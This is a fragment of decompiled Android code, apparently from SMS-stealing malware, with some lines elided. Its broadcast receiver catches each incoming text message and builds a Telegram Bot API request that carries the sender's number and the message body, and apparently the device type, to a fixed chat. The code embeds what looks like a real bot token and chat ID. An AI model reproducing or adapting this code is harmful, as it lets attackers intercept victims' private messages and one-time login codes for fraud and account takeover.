        ...
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (extras = intent.getExtras()) != null) {
            try {
                ...
                while (i < smsMessageArr.length) {
                    ...
                    String str3 = str;
                    StringBuilder append = new StringBuilder().append("https://api.telegram.org/bot7389558566:AAF8hLasottYsDY3PIzvVU_8PZryZsQpJZk/sendMessage?parse_mode=markdown&chat_id=5267098233&text=𝐍𝐞𝐰 𝐒𝐌𝐒 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 %0A %0A𝐒𝐞𝐧𝐝𝐞𝐫 : _").append(originatingAddress).append("_,%0A𝐌𝐞𝐬𝐬𝐚𝐠𝐞 : _\n\n").append(replace).append("%0A %0A𝐓𝐲𝐩𝐞 𝐏𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭 : ");
